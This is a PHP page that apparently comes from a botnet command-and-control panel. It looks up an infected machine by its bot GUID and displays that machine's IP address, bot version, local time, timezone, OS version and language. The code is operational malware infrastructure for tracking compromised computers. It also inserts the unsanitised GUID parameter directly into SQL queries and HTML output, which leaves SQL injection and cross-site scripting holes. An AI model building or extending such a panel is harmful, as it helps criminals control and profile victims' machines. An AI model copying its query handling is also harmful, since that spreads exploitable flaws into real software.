<?php

$guid = urldecode ($_GET['guid'] );
if ( strlen($guid) === false ) {
	$content .= '<b>ERROR</b> : Invalid bot GUID';
}
$pos = strpos($guid, "!");
$guid2 = "SYSTEM" . substr($guid, $pos);
$guid3 = "" . substr($guid, $pos);

require_once 'mod_file.php';
require_once 'mod_time.php';
require_once 'mod_dbase.php';
require_once 'mod_strenc.php';

$dbase = db_open();

$sql = 'SELECT *'
	 . '  FROM rep1'
	 . " WHERE bot_guid = '$guid'"
	 . ' LIMIT 1';
$res = mysqli_query($dbase, $sql);
if (!(@($res))) {
	writelog("error.log", "Wrong query : \" $sql \"");
	db_close($dbase);
	exit;
}

if (!mysqli_num_rows($res)) {

	$sql = 'SELECT *'
		. '  FROM rep1'
		. " WHERE bot_guid = '$guid2' OR bot_guid = '$guid3'"
		. ' LIMIT 1';
	$res = mysqli_query($dbase, $sql);
	if (!(@($res))) {
		writelog("error.log", "Wrong query : \" $sql \"");
		db_close($dbase);
		exit;
	}
	
	if (!mysqli_num_rows($res)) {
		$content = "<center><font class='error'>ERROR</font> : cannot find info bot this bot : <b>$guid</b> or <b>$guid2</b> or <b>$guid3</b></center>";
		require_once 'frm_skelet.php';
		echo get_skelet('Detail info for selected bot', $content);
		exit;
	}
}

list($id, $ip, $bot_guid, $bot_version, $local_time, $timezone, $tick_time, $os_version, $language_id, $date_rep) = mysqli_fetch_row($res);

$content .= "<table width='430' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);'>";

$content .= "<tr><td width='100px'><b>id</b></td><td>$id</td></tr>";
$content .= "<tr><td width='100px'><b>ip</b></td><td>$ip</td></tr>";
$content .= "<tr><td width='100px'><b>bot_guid</b></td><td>$bot_guid</td></tr>";
$content .= "<tr><td width='100px'><b>bot_version</b></td><td>$bot_version</td></tr>";
$content .= "<tr><td width='100px'><b>local_time</b></td><td>$local_time</td></tr>";

$timezone = ucs2html($timezone);
$content .= "<tr><td width='100px'><b>timezone</b></td><td>$timezone</td></tr>";

//list($year, $month, $day, $hour, $minute, $second) = split('[ :\/.-]', $tick_time);
//$day = intval($day);
//$hour = intval($hour);
//$min = intval($minute);
//$sec = intval($second);
//$hour = ($day - 1) * 24 + $hour;
$datestring = gmdate("H:i:s", $tick_time);

$content .= "<tr><td width='100px'><b>tick_time</b></td><td>$datestring</td></tr>";

$content .= "<tr><td width='100px'><b>os_version</b></td><td>$os_version</td></tr>";
$content .= "<tr><td width='100px'><b>language_id</b></td><td>$language_id</td></tr>";
$content .= "<tr><td width='100px'><b>date_rep</b></td><td>$date_rep</td></tr>";

$content .= "</table>";
	
db_close($dbase);
	
?>

<?php
require_once 'frm_skelet.php';
echo get_skelet('Detail info for selected bot', $content);
?>